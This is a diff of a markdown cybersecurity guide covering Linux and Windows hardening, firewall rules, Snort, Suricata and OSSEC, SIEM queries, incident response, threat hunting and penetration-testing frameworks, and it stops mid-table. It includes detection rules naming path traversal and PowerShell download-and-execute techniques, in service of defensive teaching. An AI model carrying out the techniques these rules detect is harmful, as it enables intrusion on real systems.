+| **Data** | Information protection | Encryption, DLP | Access controls, classification |
+| **User** | Human element security | Training, awareness | Security policies, procedures |
+
+### System Hardening
+
+Hardening involves securing systems by reducing their attack surface and eliminating unnecessary services.
+
+#### Linux System Hardening
+
+**Service Management**
+
+| Task | Commands | Purpose |
+|---|---|---|
+| List all services | `systemctl list-unit-files --type=service` | Audit running services |
+| Disable service | `sudo systemctl disable telnet.service` | Remove unnecessary services |
+| Mask service | `sudo systemctl mask telnet.service` | Prevent service activation |
+| Check service status | `systemctl status ssh.service` | Verify service state |
+
+**File System Hardening**
+
+| Task | Commands | Purpose |
+|---|---|---|
+| Find SUID files | `find / -perm -4000 -type f 2>/dev/null` | Audit privileged executables |
+| Find world-writable files | `find / -perm -002 -type f 2>/dev/null` | Find insecure permissions |
+| Check file attributes | `lsattr filename` | Extended file attributes |
+| Set immutable | `sudo chattr +i /etc/passwd` | Protect critical files |
+
+**Network Hardening**
+
+| Configuration | File/Command | Purpose |
+|---|---|---|
+| Disable IP forwarding | `echo 'net.ipv4.ip_forward = 0' >> /etc/sysctl.conf` | Prevent routing |
+| Enable SYN cookies | `echo 'net.ipv4.tcp_syncookies = 1' >> /etc/sysctl.conf` | SYN flood protection |
+| Disable ICMP redirects | `echo 'net.ipv4.conf.all.accept_redirects = 0' >> /etc/sysctl.conf` | Prevent redirection attacks |
+| Log martians | `echo 'net.ipv4.conf.all.log_martians = 1' >> /etc/sysctl.conf` | Log suspicious packets |
+
+#### Windows System Hardening
+
+**Group Policy Hardening**
+
+| Policy Area | Setting | Purpose |
+|---|---|---|
+| Password Policy | Complex passwords, 90-day expiration | Strengthen authentication |
+| Account Lockout | 5 failed attempts, 30-minute lockout | Prevent brute force |
+| Audit Policy | Log successful/failed logons | Enable monitoring |
+| User Rights | Minimize administrative accounts | Principle of least privilege |
+
+**Registry Hardening**
+
+| Registry Key | Value | Purpose |
+|---|---|---|
+| `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\DisableDomainCreds` | 1 | Disable cached credentials |
+| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA` | 1 | Enable User Account Control |
+| `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal` | 1 | Secure channel protection |
+
+**Exercises: System Hardening**
+
+1. Create a hardening checklist for a new Linux server
+2. Disable unnecessary services on a test system
+3. Configure sysctl parameters for network security
+4. Implement file integrity monitoring using AIDE
+
+---
 
 ### Firewall Configuration
 
-**iptables (Traditional Linux Firewall):**
-```bash
-# Basic iptables rules
-# Allow loopback
-iptables -A INPUT -i lo -j ACCEPT
+Firewalls are the first line of defense in network security.
 
-# Allow established connections
-iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+#### iptables (Traditional Linux Firewall)
 
-# Allow SSH
-iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+**Basic iptables Rules**
 
-# Allow HTTP/HTTPS
-iptables -A INPUT -p tcp --dport 80 -j ACCEPT
-iptables -A INPUT -p tcp --dport 443 -j ACCEPT
+| Rule Type | Command | Purpose |
+|---|---|---|
+| Allow loopback | `iptables -A INPUT -i lo -j ACCEPT` | Local communication |
+| Allow established | `iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT` | Return traffic |
+| Allow SSH | `iptables -A INPUT -p tcp --dport 22 -j ACCEPT` | Remote access |
+| Drop all | `iptables -P INPUT DROP` | Default deny |
 
-# Drop everything else
-iptables -P INPUT DROP
-iptables -P FORWARD DROP
-iptables -P OUTPUT ACCEPT
+**Advanced iptables Techniques**
 
-# Save rules
-iptables-save > /etc/iptables/rules.v4
+| Technique | Command | Purpose |
+|---|---|---|
+| Rate limiting | `iptables -A INPUT -p tcp --dport 22 -m limit --limit 5/min -j ACCEPT` | Prevent brute force |
+| Geographic blocking | `iptables -A INPUT -m geoip --src-cc CN -j DROP` | Block countries |
+| Time-based rules | `iptables -A INPUT -m time --timestart 09:00 --timestop 17:00 -j ACCEPT` | Business hours |
+| Port knocking | Complex rule set | Hidden service access |
 
-# Advanced rules
-# Rate limiting SSH
-iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set
-iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP
+#### UFW (Uncomplicated Firewall)
 
-# Block specific IPs
-iptables -A INPUT -s 192.168.1.100 -j DROP
+**UFW Basic Commands**
 
-# Port forwarding
-iptables -t nat -A PREROUTING -p tcp --dport 8080 -j REDIRECT --to-port 80
-```
+| Command | Purpose |
+|---|---|
+| `sudo ufw enable` | Enable firewall |
+| `sudo ufw default deny incoming` | Default deny policy |
+| `sudo ufw allow ssh` | Allow SSH service |
+| `sudo ufw allow from 192.168.1.0/24` | Allow subnet |
+| `sudo ufw status numbered` | Show rules with numbers |
+| `sudo ufw delete 3` | Delete rule number 3 |
 
-**UFW (Uncomplicated Firewall):**
-```bash
-# UFW basic usage
-sudo ufw enable                      # Enable firewall
-sudo ufw default deny incoming       # Default deny incoming
-sudo ufw default allow outgoing      # Default allow outgoing
+#### Windows Firewall
 
-# Allow services
-sudo ufw allow ssh                   # Allow SSH (port 22)
-sudo ufw allow 80/tcp               # Allow HTTP
-sudo ufw allow 'Nginx Full'         # Allow Nginx profile
+**PowerShell Firewall Commands**
 
-# Specific rules
-sudo ufw allow from 192.168.1.0/24  # Allow from subnet
-sudo ufw deny from 192.168.1.100    # Block specific IP
-sudo ufw allow out 53                # Allow DNS outgoing
+| Command | Purpose |
+|---|---|
+| `Get-NetFirewallRule` | List firewall rules |
+| `New-NetFirewallRule -DisplayName "Block Telnet" -Direction Inbound -Protocol TCP -LocalPort 23 -Action Block` | Block telnet |
+| `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True` | Enable all profiles |
+| `Get-NetFirewallProfile` | Check profile status |
 
-# View rules
-sudo ufw status verbose              # Show detailed status
-sudo ufw status numbered             # Show rule numbers
-sudo ufw delete 2                    # Delete rule by number
-```
+**Exercises: Firewall Configuration**
 
-**firewalld (RHEL/CentOS):**
-```bash
-# Firewalld management
-sudo firewall-cmd --state            # Check status
-sudo firewall-cmd --get-default-zone # Show default zone
-sudo firewall-cmd --list-all         # List all rules
-
-# Zone management
-sudo firewall-cmd --get-zones        # List available zones
-sudo firewall-cmd --zone=public --add-service=http --permanent
-sudo firewall-cmd --zone=public --add-port=8080/tcp --permanent
-sudo firewall-cmd --reload           # Apply changes
-
-# Rich rules
-sudo firewall-cmd --add-rich-rule='rule family="ipv4" source address="192.168.1.0/24" accept' --permanent
-```
-
-### Access Control
-
-**SSH Hardening:**
-```bash
-# /etc/ssh/sshd_config security settings
-Protocol 2                           # Use SSH protocol 2 only
-Port 2222                            # Change default port
-PermitRootLogin no                    # Disable root login
-PasswordAuthentication no            # Use key-based auth only
-PubkeyAuthentication yes             # Enable key authentication
-MaxAuthTries 3                       # Limit authentication attempts
-ClientAliveInterval 300              # Timeout idle connections
-ClientAliveCountMax 2                # Max idle connection checks
-AllowUsers username                  # Limit users who can SSH
-DenyUsers baduser                    # Explicitly deny users
-
-# SSH key management
-ssh-keygen -t ed25519 -C "user@host" # Generate secure key
-ssh-copy-id -i ~/.ssh/id_ed25519.pub user@host  # Copy public key
-
-# SSH with additional security
-ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@host  # Testing
-ssh -o PasswordAuthentication=no user@host    # Force key authentication
-```
-
-**User Account Security:**
-```bash
-# Password policies
-# /etc/security/pwquality.conf
-minlen = 12                          # Minimum password length
-dcredit = -1                         # Require digits
-ucredit = -1                         # Require uppercase
-lcredit = -1                         # Require lowercase
-ocredit = -1                         # Require special characters
-
-# Account lockout
-# /etc/security/faillock.conf
-deny = 5                             # Lock after 5 failed attempts
-unlock_time = 900                    # Unlock after 15 minutes
-
-# Sudo security
-# /etc/sudoers
-Defaults timestamp_timeout=15        # Sudo timeout
-Defaults requiretty                  # Require TTY for sudo
-Defaults log_input,log_output        # Log sudo commands
-```
-
-### Intrusion Detection
-
-**Fail2Ban Configuration:**
-```bash
-# Install and configure Fail2Ban
-sudo apt install fail2ban            # Install (Debian/Ubuntu)
-
-# /etc/fail2ban/jail.local
-[DEFAULT]
-bantime = 3600                       # Ban for 1 hour
-findtime = 600                       # Find failures in 10 minutes
-maxretry = 3                         # Max 3 attempts
-backend = systemd                    # Use systemd backend
-
-[sshd]
-enabled = true
-port = ssh
-filter = sshd
-logpath = /var/log/auth.log
-maxretry = 3
-
-[nginx-http-auth]
-enabled = true
-filter = nginx-http-auth
-logpath = /var/log/nginx/error.log
-maxretry = 3
-
-# Fail2Ban management
-sudo fail2ban-client status          # Show jails
-sudo fail2ban-client status sshd     # Show SSH jail status
-sudo fail2ban-client unban 192.168.1.100  # Unban IP
-```
-
-**AIDE (Advanced Intrusion Detection Environment):**
-```bash
-# Install and configure AIDE
-sudo apt install aide                # Install AIDE
-
-# Initialize database
-sudo aide --init                     # Create initial database
-sudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db
-
-# Check for changes
-sudo aide --check                    # Check for file changes
-sudo aide --update                   # Update database
-
-# /etc/aide/aide.conf configuration
-/bin p+i+n+u+g+s+b+m+c+md5+sha1     # Monitor /bin directory
-/etc p+i+n+u+g+s+b+m+c+md5+sha1     # Monitor /etc directory
-!/var/log                            # Exclude log directory
-```
-
-### Security Auditing
-
-**System Security Auditing:**
-```bash
-# Lynis security auditing
-sudo lynis audit system              # Comprehensive security audit
-sudo lynis show profiles             # Show audit profiles
-sudo lynis show tests                # Show available tests
-
-# CIS-CAT (Center for Internet Security)
-# Commercial tool for CIS benchmark compliance
-
-# OpenSCAP security compliance
-sudo apt install libopenscap8        # Install OpenSCAP
-oscap info /usr/share/xml/scap/ssg/content/ssg-ubuntu1804-ds.xml  # Show profiles
-sudo oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_standard --results results.xml /usr/share/xml/scap/ssg/content/ssg-ubuntu1804-ds.xml
-```
-
-**Log Monitoring:**
-```bash
-# Logwatch configuration
-sudo apt install logwatch            # Install Logwatch
-sudo logwatch --detail high --service ssh --range yesterday  # SSH log summary
-
-# OSSEC HIDS (Host Intrusion Detection System)
-# Real-time log analysis and intrusion detection
-
-# ELK Stack (Elasticsearch, Logstash, Kibana)
-# Centralized logging and analysis platform
-```
+1. Configure iptables to allow only SSH and HTTP traffic
+2. Set up UFW with application-specific rules
+3. Create a Windows firewall rule to block a specific application
+4. Implement geo-blocking using iptables
 
 ---
 
-## Advanced Topics
+### Intrusion Detection & Prevention
 
-### Kernel & Modules
+IDS/IPS systems monitor network traffic and system activity for malicious behavior.
 
-**Kernel Information:**
+#### Snort IDS/IPS
+
+**Snort Configuration**
+
+| Component | Purpose | Configuration File |
+|---|---|---|
+| **Preprocessors** | Traffic normalization | `snort.conf` |
+| **Rules** | Signature detection | `/etc/snort/rules/` |
+| **Output** | Alert handling | Database, syslog, files |
+| **Variables** | Network definitions | `HOME_NET`, `EXTERNAL_NET` |
+
+**Snort Rules Syntax**
+
 ```bash
-# Kernel version and information
-uname -r                             # Kernel version
-uname -a                             # All system information
-cat /proc/version                    # Detailed kernel version
-hostnamectl                          # System information including kernel
+# Basic rule structure
+action protocol source_ip source_port direction dest_ip dest_port (rule_options)
 
-# Kernel configuration
-cat /proc/config.gz | gunzip         # Current kernel config (if available)
-cat /boot/config-$(uname -r)        # Kernel config file
-
-# Kernel parameters
-cat /proc/cmdline                    # Boot parameters
-sysctl -a                           # All kernel parameters
-sysctl kernel.hostname              # Specific parameter
-sudo sysctl -w net.ipv4.ip_forward=1  # Set parameter temporarily
-
-# Permanent kernel parameters
-# /etc/sysctl.conf
-net.ipv4.ip_forward=1               # Enable IP forwarding
-vm.swappiness=10                     # Reduce swap usage
-fs.file-max=65536                   # Increase file limit
+# Example rules
+alert tcp any any -> $HOME_NET 80 (msg:"Possible web attack"; content:"../../../"; sid:1000001;)
+alert icmp any any -> $HOME_NET any (msg:"ICMP Ping"; itype:8; sid:1000002;)
+alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"SSH Brute Force"; flags:S; threshold:type both, track by_src, count 5, seconds 60; sid:1000003;)
 ```
 
-**Module Management:**
-```bash
-# List modules
-lsmod                               # Currently loaded modules
-modinfo module_name                 # Module information
-find /lib/modules/$(uname -r) -name "*.ko"  # All available modules
+**Snort Rule Keywords**
 
-# Load/unload modules
-sudo modprobe module_name           # Load module
-sudo modprobe -r module_name        # Unload module
-sudo insmod /path/to/module.ko      # Insert module directly
-sudo rmmod module_name              # Remove module
+| Keyword | Purpose | Example |
+|---|---|---|
+| `msg` | Alert message | `msg:"SQL Injection Attempt"` |
+| `content` | Pattern matching | `content:"SELECT * FROM"` |
+| `pcre` | Regular expressions | `pcre:"/union.*select/i"` |
+| `threshold` | Rate limiting | `threshold:type limit, track by_src, count 1, seconds 60` |
+| `reference` | External references | `reference:cve,2021-44228` |
 
-# Module configuration
-/etc/modules                        # Modules to load at boot
-/etc/modprobe.conf                  # Module parameters
-/etc/modprobe.d/                    # Additional module configs
+#### Suricata IDS/IPS
 
-# Module blacklisting
-# /etc/modprobe.d/blacklist.conf
-blacklist module_name               # Prevent module from loading
+**Suricata vs. Snort**
+
+| Feature | Suricata | Snort |
+|---|---|---|
+| **Multi-threading** | Yes | No (Snort 3.0+) |
+| **Protocol support** | Extensive | Good |
+| **Performance** | Higher | Good |
+| **Rule compatibility** | Snort-compatible | Native |
+| **Output formats** | JSON, EVE | Various |
+
+**Suricata Configuration**
+
+```yaml
+# suricata.yaml example
+vars:
+  address-groups:
+    HOME_NET: "[192.168.0.0/16,10.0.0.0/8,172.16.0.0/12]"
+    EXTERNAL_NET: "!$HOME_NET"
+
+rule-files:
+  - suricata.rules
+  - emerging-threats.rules
+
+outputs:
+  - eve-log:
+      enabled: yes
+      filetype: regular
+      filename: eve.json
 ```
 
-### System Calls
+#### Host-based Intrusion Detection
 
-**System Call Tracing:**
-```bash
-# strace - trace system calls
-strace ls                           # Trace ls command
-strace -o output.txt command        # Save trace to file
-strace -p 1234                      # Trace running process
-strace -e open ls                   # Trace only open syscalls
-strace -c ls                        # Summary of syscall counts
+**OSSEC HIDS**
 
-# ltrace - trace library calls
-ltrace ls                           # Trace library calls
-ltrace -p 1234                      # Trace running process
+| Component | Purpose | Configuration |
+|---|---|---|
+| **Log monitoring** | File integrity monitoring | `/var/ossec/etc/ossec.conf` |
+| **Rootkit detection** | System compromise detection | Built-in checks |
+| **Active response** | Automated countermeasures | Firewall rules, alerts |
+| **Centralized logging** | Log aggregation | Server-agent architecture |
 
-# System call monitoring
-sudo perf record -g command         # Record performance data
-sudo perf report                    # Analyze performance data
+**OSSEC Configuration Example**
+
+```xml
+<ossec_config>
+  <syscheck>
+    <directories check_all="yes">/etc,/usr/bin,/usr/sbin</directories>
+    <directories check_all="yes">/bin,/sbin</directories>
+    <ignore>/etc/mtab</ignore>
+    <ignore>/etc/hosts.deny</ignore>
+  </syscheck>
+  
+  <rootcheck>
+    <rootkit_files>/var/ossec/etc/shared/rootkit_files.txt</rootkit_files>
+    <rootkit_trojans>/var/ossec/etc/shared/rootkit_trojans.txt</rootkit_trojans>
+  </rootcheck>
+</ossec_config>
 ```
 
-**Process Debugging:**
-```bash
-# GDB debugging
-gdb program                         # Start GDB
-gdb -p 1234                        # Attach to running process
-(gdb) run                          # Run program
-(gdb) bt                           # Backtrace
-(gdb) info registers               # Show registers
-(gdb) x/10i $pc                    # Disassemble
+**Exercises: Intrusion Detection**
 
-# Core dump analysis
-ulimit -c unlimited                # Enable core dumps
-gdb program core                   # Analyze core dump
-```
-
-### Memory Management
-
-**Memory Information:**
-```bash
-# Memory statistics
-cat /proc/meminfo                   # Detailed memory information
-cat /proc/buddyinfo                # Memory fragmentation
-cat /proc/slabinfo                 # Kernel slab allocator
-cat /proc/vmstat                   # Virtual memory statistics
-
-# Process memory
-cat /proc/PID/maps                 # Process memory mapping
-cat /proc/PID/smaps                # Detailed memory mapping
-cat /proc/PID/status               # Process status including memory
-
-# Memory debugging
-valgrind --leak-check=full program # Memory leak detection
-```
-
-**Virtual Memory Tuning:**
-```bash
-# VM parameters
-echo 10 > /proc/sys/vm/swappiness  # Reduce swap usage
-echo 1 > /proc/sys/vm/overcommit_memory  # Always overcommit
-echo 100 > /proc/sys/vm/dirty_ratio  # Dirty page ratio
-
-# Huge pages
-echo 1024 > /proc/sys/vm/nr_hugepages  # Set huge pages
-mount -t hugetlbfs none /mnt/hugepages  # Mount huge pages filesystem
-```
-
-### Custom Compilation
-
-**Kernel Compilation:**
-```bash
-# Download kernel source
-wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.15.tar.xz
-tar -xf linux-5.15.tar.xz
-cd linux-5.15
-
-# Configure kernel
-make menuconfig                     # Interactive configuration
-make oldconfig                     # Use existing config
-cp /boot/config-$(uname -r) .config  # Use current kernel config
-
-# Compile kernel
-make -j$(nproc)                     # Compile using all CPU cores
-make modules                        # Compile modules
-sudo make modules_install           # Install modules
-sudo make install                   # Install kernel
-
-# Update bootloader
-sudo update-grub                    # Ubuntu/Debian
-sudo grub2-mkconfig -o /boot/grub2/grub.cfg  # RHEL/CentOS
-```
-
-**Software Compilation Optimization:**
-```bash
-# GCC optimization flags
-export CFLAGS="-O3 -march=native -mtune=native"
-export CXXFLAGS="$CFLAGS"
-
-# Configure and build
-./configure --prefix=/usr/local --enable-optimizations
-make -j$(nproc) CFLAGS="$CFLAGS"
-sudo make install
-
-# Profile-guided optimization
-./configure --enable-pgo
-make profile-opt
-```
+1. Install and configure Snort with basic rules
+2. Create custom Snort rules for your environment
+3. Set up Suricata with emerging threats rules
+4. Configure OSSEC for file integrity monitoring
 
 ---
 
-## Practical Projects
+### Log Analysis & SIEM
+
+Security Information and Event Management (SIEM) systems collect, analyze, and correlate security events.
+
+#### Log Sources and Types
+
+**Common Log Sources**
+
+| Source | Log Type | Location | Key Events |
+|---|---|---|---|
+| **System logs** | Authentication, system events | `/var/log/auth.log`, `/var/log/syslog` | Logins, sudo usage |
+| **Web servers** | Access, error logs | `/var/log/apache2/`, `/var/log/nginx/` | HTTP requests, errors |
+| **Firewalls** | Network traffic | Varies by vendor | Blocked connections |
+| **IDS/IPS** | Security alerts | `/var/log/snort/`, `/var/log/suricata/` | Attack signatures |
+| **Applications** | Business logic | Application-specific | User actions, errors |
+
+#### ELK Stack (Elasticsearch, Logstash, Kibana)
+
+**ELK Stack Components**
+
+| Component | Purpose | Key Features |
+|---|---|---|
+| **Elasticsearch** | Search and analytics engine | Distributed, RESTful, real-time |
+| **Logstash** | Data processing pipeline | Input, filter, output plugins |
+| **Kibana** | Visualization platform | Dashboards, charts, maps |
+| **Beats** | Lightweight shippers | Filebeat, Metricbeat, Packetbeat |
+
+**Logstash Configuration Example**
+
+```ruby
+# logstash.conf
+input {
+  beats {
+    port => 5044
+  }
+}
+
+filter {
+  if [fields][log_type] == "apache" {
+    grok {
+      match => { "message" => "%{COMBINEDAPACHELOG}" }
+    }
+    date {
+      match => [ "timestamp", "dd/MMM/yyyy:HH:mm:ss Z" ]
+    }
+  }
+}
+
+output {
+  elasticsearch {
+    hosts => ["localhost:9200"]
+    index => "logstash-apache-%{+YYYY.MM.dd}"
+  }
+}
+```
+
+#### Splunk
+
+**Splunk Search Processing Language (SPL)**
+
+| Command | Purpose | Example |
+|---|---|---|
+| `search` | Basic search | `search index=main "failed login"` |
+| `stats` | Statistical operations | `stats count by source_ip` |
+| `eval` | Create calculated fields | `eval duration=end_time-start_time` |
+| `where` | Filter results | `where count > 100` |
+| `timechart` | Time-based visualization | `timechart span=1h count` |
+
+**Common Splunk Searches**
+
+| Use Case | SPL Query |
+|---|---|
+| Failed logins | `index=security EventCode=4625 | stats count by Account_Name` |
+| Top talking hosts | `index=firewall | top src_ip` |
+| Suspicious file access | `index=windows EventCode=4663 | search "\.exe$"` |
+| Network anomalies | `index=network | stats avg(bytes) as avg_bytes by src_ip | where avg_bytes > 1000000` |
+
+#### Open Source SIEM Solutions
+
+**Wazuh**
+
+| Feature | Description | Benefit |
+|---|---|---|
+| **Log collection** | Multi-platform agent | Centralized logging |
+| **Rule engine** | Custom correlation rules | Flexible detection |
+| **Compliance** | PCI DSS, HIPAA, SOX | Regulatory compliance |
+| **Threat intelligence** | IOC integration | Enhanced detection |
+
+**Security Onion**
+
+| Component | Purpose | Integration |
+|---|---|---|
+| **Suricata** | Network IDS | Full packet capture |
+| **Zeek** | Network analysis | Protocol logging |
+| **Wazuh** | Host monitoring | Endpoint visibility |
+| **Kibana** | Visualization | Unified dashboard |
+
+**Exercises: Log Analysis & SIEM**
+
+1. Set up an ELK stack for log analysis
+2. Create Kibana dashboards for security monitoring
+3. Write Splunk queries for common security use cases
+4. Configure Wazuh for host-based monitoring
+
+---
+
+### Incident Response
+
+When security incidents occur, having a structured response process is critical.
+
+#### Incident Response Framework
+
+**NIST Incident Response Lifecycle**
+
+| Phase | Activities | Key Outputs |
+|---|---|---|
+| **Preparation** | Policies, procedures, tools | IR plan, team training |
+| **Detection & Analysis** | Monitoring, investigation | Incident classification |
+| **Containment** | Isolate threat, preserve evidence | Contained incident |
+| **Eradication** | Remove threat, patch vulnerabilities | Clean environment |
+| **Recovery** | Restore services, monitor | Operational systems |
+| **Lessons Learned** | Post-incident review | Improved procedures |
+
+#### Digital Forensics Tools
+
+**Memory Analysis**
+
+| Tool | Purpose | Key Features |
+|---|---|---|
+| **Volatility** | Memory forensics | Process analysis, network connections |
+| **Rekall** | Memory analysis | Live analysis, timeline |
+| **LiME** | Memory acquisition | Linux memory extractor |
+
+**Volatility Commands**
+
+| Command | Purpose |
+|---|---|
+| `volatility -f memory.dump imageinfo` | Identify OS profile |
+| `volatility -f memory.dump --profile=Win7SP1x64 pslist` | List processes |
+| `volatility -f memory.dump --profile=Win7SP1x64 netscan` | Network connections |
+| `volatility -f memory.dump --profile=Win7SP1x64 malfind` | Find injected code |
+
+**Disk Forensics**
+
+| Tool | Purpose | Platform |
+|---|---|---|
+| **Autopsy** | Disk analysis GUI | Cross-platform |
+| **Sleuth Kit** | Command-line forensics | Unix/Linux |
+| **FTK** | Commercial forensics | Windows |
+| **EnCase** | Enterprise forensics | Windows |
+
+**Network Forensics**
+
+| Tool | Purpose | Features |
+|---|---|---|
+| **Wireshark** | Packet analysis | Protocol dissection |
+| **tcpdump** | Packet capture | Command-line capture |
+| **NetworkMiner** | Network forensics | File extraction, host details |
+
+#### Incident Documentation
+
+**Essential Documentation**
+
+| Document | Purpose | Key Information |
+|---|---|---|
+| **Incident report** | Executive summary | Timeline, impact, resolution |
+| **Technical analysis** | Detailed findings | IOCs, attack vectors, evidence |
+| **Chain of custody** | Evidence handling | Who, what, when, where |
+| **Lessons learned** | Process improvement | Gaps, recommendations |
+
+**Indicators of Compromise (IOCs)**
+
+| IOC Type | Examples | Purpose |
+|---|---|---|
+| **File hashes** | MD5, SHA1, SHA256 | Malware identification |
+| **IP addresses** | Command & control servers | Network blocking |
+| **Domain names** | Malicious domains | DNS blocking |
+| **File paths** | Malware locations | Host cleanup |
+| **Registry keys** | Persistence mechanisms | System hardening |
+
+**Exercises: Incident Response**
+
+1. Create an incident response playbook for your organization
+2. Practice memory analysis using Volatility
+3. Perform disk forensics on a compromised system image
+4. Document an incident using proper chain of custody procedures
+
+---
+
+### Threat Hunting
+
+Proactive threat hunting involves searching for threats that have evaded existing security controls.
+
+#### Threat Hunting Methodology
+
+**Hypothesis-Driven Hunting**
+
+| Phase | Activity | Output |
+|---|---|---|
+| **Hypothesis** | Threat assumption | Testable hypothesis |
+| **Collection** | Data gathering | Relevant datasets |
+| **Analysis** | Pattern investigation | Findings |
+| **Response** | Action on findings | Improved detection |
+
+#### Hunting Techniques
+
+**Baseline Analysis**
+
+| Metric | Normal Behavior | Hunting Focus |
+|---|---|---|
+| **Network traffic** | Predictable patterns | Unusual destinations |
+| **Process execution** | Known applications | Suspicious processes |
+| **File system** | Standard locations | Unusual file placement |
+| **User behavior** | Regular patterns | Anomalous activities |
+
+**Threat Intelligence Integration**
+
+| Intelligence Type | Source | Application |
+|---|---|---|
+| **Strategic** | Reports, briefings | Threat landscape awareness |
+| **Tactical** | TTPs, campaigns | Hunt hypothesis development |
+| **Operational** | IOCs, signatures | Detection rule creation |
+
+#### Hunting Tools and Platforms
+
+**Open Source Tools**
+
+| Tool | Purpose | Key Features |
+|---|---|---|
+| **YARA** | Malware identification | Pattern matching rules |
+| **Sigma** | Log detection rules | Generic signatures |
+| **Mordor** | Attack datasets | Research data |
+| **HELK** | Hunting platform | ELK-based analytics |
+
+**YARA Rules Example**
+
+```yara
+rule Suspicious_PowerShell
+{
+    meta:
+        author = "Threat Hunter"
+        description = "Detects suspicious PowerShell commands"
+        
+    strings:
+        $cmd1 = "Invoke-Expression" nocase
+        $cmd2 = "DownloadString" nocase
+        $cmd3 = "EncodedCommand" nocase
+        $cmd4 = "FromBase64String" nocase
+        
+    condition:
+        any of ($cmd*)
+}
+```
+
+**Sigma Rules Example**
+
+```yaml
+title: Suspicious Process Creation
+description: Detects suspicious process execution
+author: Threat Hunter
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|endswith:
+            - '\powershell.exe'
+            - '\cmd.exe'
+        CommandLine|contains:
+            - 'Invoke-Expression'
+            - 'DownloadString'
+    condition: selection
+falsepositives:
+    - Legitimate administration
+level: medium
+```
+
+#### Advanced Hunting Techniques
+
+**Behavioral Analysis**
+
+| Technique | Description | Tools |
+|---|---|---|
+| **Frequency analysis** | Unusual event frequencies | Statistical analysis |
+| **Stack counting** | Rare event identification | Log aggregation |
+| **Beaconing detection** | C2 communication patterns | Network analysis |
+| **Lateral movement** | Unusual authentication patterns | Authentication logs |
+
+**Machine Learning in Hunting**
+
+| Approach | Application | Benefits |
+|---|---|---|
+| **Anomaly detection** | Baseline deviation | Unsupervised learning |
+| **Classification** | Threat categorization | Supervised learning |
+| **Clustering** | Event grouping | Pattern identification |
+| **Time series** | Temporal patterns | Trend analysis |
+
+**Exercises: Threat Hunting**
+
+1. Develop hunting hypotheses based on current threat intelligence
+2. Create YARA rules for malware detection
+3. Write Sigma rules for suspicious activities
+4. Perform behavioral analysis on network logs
+
+---
+
+## 🎯 Penetration Testing Methodology
+
+Penetration testing is a structured approach to finding and exploiting vulnerabilities in systems, applications, and networks. Professional penetration testing follows established methodologies and frameworks.
+
+### Testing Frameworks
+
+#### OWASP Testing Guide
+
+The OWASP Testing Guide provides a comprehensive framework for web application security testing.
+
+**OWASP Testing Categories**
+
+| Category | Focus Area | Key Tests |
+|---|---|---|
+| **Information Gathering** | Reconnaissance | Fingerprinting, directory discovery |
+| **Configuration Management** | Server hardening | Default accounts, directory traversal |
+| **Authentication** | Identity verification | Brute force, session management |
+| **Authorization** | Access control | Privilege escalation, forced browsing |
+| **Session Management** | Session security | Session fixation, hijacking |
+| **Input Validation** | Data handling | SQL injection, XSS, buffer overflow |
+| **Error Handling** | Information disclosure | Stack traces, error messages |
+| **Cryptography** | Data protection | Weak encryption, certificate validation |
+| **Business Logic** | Application flow | Workflow bypass, race conditions |
+| **Client Side** | Browser security | DOM-based XSS, local storage |
+
+#### PTES (Penetration Testing Execution Standard)
+
+**PTES Phases**
+
+| Phase | Activities | Deliverables |
+|---|---|---|
+| **Pre-engagement** | Scoping, contracts | Statement of work, rules of engagement |
+| **Intelligence Gathering** | OSINT, reconnaissance | Target information, attack surface |
+| **Threat Modeling** | Risk analysis | Threat scenarios, attack vectors |
+| **Vulnerability Analysis** | Scanning, enumeration | Vulnerability report |
+| **Exploitation** | Gaining access | Proof of concept exploits |
+| **Post Exploitation** | Privilege escalation, persistence | Network diagram, sensitive data |
+| **Reporting** | Documentation | Executive summary, technical findings |
+
+#### NIST SP 800-115
+
+**NIST Testing Methodology**
+
+| Phase | Description | Key Activities |
+|---|---|---|
+| **Planning** | Test preparation | Scope definition, team assembly |
+| **Discovery** | Information gathering | Network discovery, service enumeration |
+| **Attack** | Vulnerability exploitation | Gaining unauthorized access |
+| **Reporting** | Results documentation | Findings, recommendations |
+
+#### OSSTMM (Open Source Security Testing Methodology Manual)
+
+**OSSTMM Channels**
+
+| Channel | Focus | Testing Areas |
+|---|---|---|
+| **Human** | Social engineering | Personnel security awareness |
+| **Physical** | Physical security | Facility access, device security |
+| **Wireless** | RF communications | WiFi, Bluetooth, cellular |
+| **Telecommunications** | Voice/data networks | PBX, VoIP, modems |
+| **Data Networks** | IP networks | Firewalls, routers, services |
+
+### Professional Tools
+
+#### Commercial Penetration Testing Platforms
+
+**Metasploit Pro**
+
+| Feature | Description | Use Case |
+|---|---|---|
+| **Automated exploitation** | Guided exploit selection | Efficient vulnerability validation |
+| **Post-exploitation** | Advanced pivoting | Network traversal |
+| **Social engineering** | Phishing campaigns | User awareness testing |
+| **Reporting** | Professional reports | Client deliverables |
+
+**Core Impact**
+
+| Module | Purpose | Capabilities |
+|---|---|---|
+| **Network RPT** | Network testing | Automated exploitation |
+| **Web RPT** | Web application testing | OWASP Top 10 coverage |
+| **Client Side RPT** | Client-side attacks | Browser exploitation |
+| **WiFi RPT** | Wireless testing | WPA/WEP cracking |
+
+**Burp Suite Professional**
+
+| Component | Function | Advanced Features |
+|---|---|---|
+| **Proxy** | Traffic interception | SSL/TLS handling |
+| **Scanner** | Automated vulnerability scanning | Custom insertion points |
+| **Intruder** | Customized attacks | Payload processing |
+| **Repeater** | Manual testing | Request modification |
+| **Sequencer** | Randomness testing | Token analysis |
+| **Collaborator** | Out-of-band testing | SSRF, XXE detection |
+
+#### Open Source Testing Frameworks
+
+**Kali Linux Tools**
+
+| Category | Tools | Purpose |
+|---|---|---|
